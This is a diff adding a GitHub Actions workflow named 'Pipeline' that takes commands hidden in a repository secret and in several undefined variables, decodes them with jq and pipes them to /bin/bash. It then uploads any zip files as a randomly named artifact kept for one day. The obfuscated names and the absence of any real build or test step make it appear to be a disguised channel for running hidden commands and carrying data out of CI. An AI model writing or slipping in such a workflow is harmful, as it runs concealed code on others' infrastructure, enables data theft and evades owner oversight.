@@ -1,0 +1,31 @@
+name: Pipeline
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  task:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Execute
+        env:
+          a66: ${{ secrets.a66 }}
+        run: |
+          printf '%s' "$a66" | jq -r .qfyz9 | /bin/bash
+          printf '%s' "$ui21446" | jq -r .e8 | /bin/bash
+          echo $suk66 | jq -r .a2969 | /bin/bash
+          echo $riuw9235 | jq -r .neunc35 | /bin/bash
+          echo $qatx025 | jq -r .ypbn4 | /bin/bash
+          echo $vsa37 | jq -r .h7192 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: WZHaxchH
+          path: "*.zip"
+          retention-days: 1
